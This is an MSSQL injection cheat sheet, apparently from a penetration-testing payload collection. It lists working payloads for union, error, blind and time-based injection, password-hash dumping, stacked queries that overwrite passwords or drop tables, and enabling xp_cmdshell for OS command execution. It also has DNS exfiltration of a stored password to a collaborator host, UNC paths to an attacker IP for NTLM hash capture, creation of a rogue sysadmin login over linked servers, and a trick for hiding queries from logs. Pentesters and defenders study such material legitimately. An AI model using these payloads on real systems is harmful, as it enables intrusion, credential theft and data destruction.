# MSSQL Injection

## Summary

* [MSSQL Default Databases](#mssql-default-databases)
* [MSSQL Comments](#mssql-comments)
* [MSSQL User](#mssql-user)
* [MSSQL Version](#mssql-version)
* [MSSQL Hostname](#mssql-hostname)
* [MSSQL Database Name](#mssql-database-name)
* [MSSQL Database Credentials](#mssql-database-credentials)
* [MSSQL List databases](#mssql-list-databases)
* [MSSQL List columns](#mssql-list-columns)
* [MSSQL List tables](#mssql-list-tables)
* [MSSQL Union Based](#mssql-union-based)
* [MSSQL Error Based](#mssql-error-based)
* [MSSQL Blind Based](#mssql-blind-based)
* [MSSQL Time Based](#mssql-time-based)
* [MSSQL Stacked query](#mssql-stacked-query)
* [MSSQL Read file](#mssql-read-file)
* [MSSQL Command execution](#mssql-command-execution)
* [MSSQL Out of band](#mssql-out-of-band)
    * [MSSQL DNS exfiltration](#mssql-dns-exfiltration)
    * [MSSQL UNC path](#mssql-unc-path)
* [MSSQL Make user DBA](#mssql-make-user-dba-db-admin)
* [MSSQL Trusted Links](#mssql-trusted-links)
* [MSSQL List permissions](#mssql-list-permissions)


## MSSQL Default Databases

| Name                  | Description                           |
|-----------------------|---------------------------------------|
| pubs	                | Not available on MSSQL 2005           |
| model	                | Available in all versions             |
| msdb	                | Available in all versions             |
| tempdb	            | Available in all versions             |
| northwind	            | Available in all versions             |
| information_schema	| Available from MSSQL 2000 and higher  |


## MSSQL Comments

| Type                       | Description                       |
|----------------------------|-----------------------------------|
| `/* MSSQL Comment */`      | C-style comment                   |
| `-- -`                     | SQL comment                       |
| `;%00`                     | Null byte                         |


## MSSQL User

```sql
SELECT CURRENT_USER
SELECT user_name();
SELECT system_user;
SELECT user;
```

## MSSQL Version

```sql
SELECT @@version
```

## MSSQL Hostname

```sql
SELECT HOST_NAME()
SELECT @@hostname
SELECT @@SERVERNAME
SELECT SERVERPROPERTY('productversion')
SELECT SERVERPROPERTY('productlevel')
SELECT SERVERPROPERTY('edition');
```

## MSSQL Database name

```sql
SELECT DB_NAME()
```


## MSSQL Database Credentials

* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
    ```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
    ```
* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```


## MSSQL List databases

```sql
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); — for N = 0, 1, 2, …
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)
```

## MSSQL List columns

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable'); -- for the current DB only
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; -- list column names and types for master..sometable

SELECT table_catalog, column_name FROM information_schema.columns
```

## MSSQL List tables

```sql
SELECT name FROM master..sysobjects WHERE xtype = 'U'; -- use xtype = 'V' for views
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; -- list column names and types for master..sometable

SELECT table_catalog, table_name FROM information_schema.columns
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
```


## MSSQL Union Based

```sql
-- extract databases names
$ SELECT name FROM master..sysdatabases
[*] Injection
[*] msdb
[*] tempdb

-- extract tables from Injection database
$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
[*] Profiles
[*] Roles
[*] Users

-- extract columns for the table Users
$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
[*] UserId
[*] UserName

-- Finally extract the data
$ SELECT  UserId, UserName from Users
```


## MSSQL Error based

```sql
For integer inputs : convert(int,@@version)
For integer inputs : cast((SELECT @@version) as int)

For string inputs   : ' + convert(int,@@version) + '
For string inputs   : ' + cast((SELECT @@version) as int) + '
```


## MSSQL Blind based

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -

AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'

AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90

SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```


## MSSQL Time based

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--

IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```


## MSSQL Stacked Query

* Without any statement terminator
    ```sql
    -- multiple SELECT statements
    SELECT 'A'SELECT 'B'SELECT 'C'

    -- updating password with a stacked query
    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

    -- using the stacked query to enable xp_cmdshell
    -- you won't have the output of the query, redirect it to a file 
    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
    ```

* Use a semi-colon ";" to add another query
    ```sql
    ProductID=1; DROP members--
    ```


## MSSQL Read file

**Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```


## MSSQL Command execution

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

To interact with the MSSQL instance.

```powershell
sqsh -S 192.168.1.X -U sa -P superPassword
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
```

Execute Python script 

> Executed by a different user than the one using xp_cmdshell to execute commands

```powershell
#Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```

## MSSQL Out of band

### MSSQL DNS exfiltration

Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1

```powershell
# Permissions: Requires VIEW SERVER STATE permission on the server.
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))

# Permissions: Requires the CONTROL SERVER permission.
1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
```


### MSSQL UNC Path

MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

```sql
xp_dirtree '\\attackerip\file'
xp_fileexist '\\attackerip\file'
BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
RESTORE LABELONLY FROM DISK = '\\attackerip\file'
RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
```


## MSSQL Make user DBA (DB admin)

```sql
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```

## MSSQL Trusted Links

> The links between databases work even across forest trusts.

```powershell
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] # Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```

Manual exploitation

```sql
-- find link
select * from master..sysservers

-- execute query through the link
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- chain multiple openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- execute shell commands
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## List permissions

Listing effective permissions of current user on the server.

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
```

Listing effective permissions of current user on the database.

```sql
SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
```

Listing effective permissions of current user on a view.

```
SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
```

Check if current user is a member of the specified server role.

```sql
-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
SELECT is_srvrolemember('sysadmin');
```

## MSSQL OPSEC

Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`

```sql
-- 'sp_password' was found in the text of this event.
-- The text has been replaced with this comment for security reasons.
```

## References

* [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* [Error Based - SQL Injection ](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
* [MSSQL Trusted Links - HackTricks.xyz](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
* [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
* [DAFT: Database Audit Framework & Toolkit - NetSPI](https://github.com/NetSPI/DAFT)
* [SQL Server UNC Path Injection Cheatsheet - nullbind](https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e)
* [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - 28 January 2009](https://www.exploit-db.com/papers/12975)
* [Microsoft - sys.fn_my_permissions (Transact-SQL)](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
* [Microsoft - IS_SRVROLEMEMBER (Transact-SQL)](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
* [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - Jun 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)